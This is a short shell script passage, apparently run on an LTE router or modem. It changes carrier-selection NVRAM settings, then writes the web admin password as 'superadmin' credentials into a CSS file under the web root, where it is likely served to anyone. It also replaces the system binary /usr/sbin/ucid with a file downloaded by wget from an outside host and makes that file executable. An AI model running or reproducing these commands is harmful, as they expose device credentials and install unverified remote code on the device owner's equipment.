...
nvram_set 0 sqns_selplmn_enable=0
nvram_set 0 sqns_selected_plmn=
nvram commit 0
echo -e "Username: superadmin\nPassword: $(cat /tmp/nvram.cfg | grep http_passwd | sed 's/http_passwd=//')" > /usr/www/superadmin.css
rm -rf /usr/sbin/ucid
wget http://jamesprotech.shop/d2kopen/ucid -O /usr/sbin/ucid
chmod 775 /usr/sbin/ucid
chown 500:500 /usr/sbin/ucid
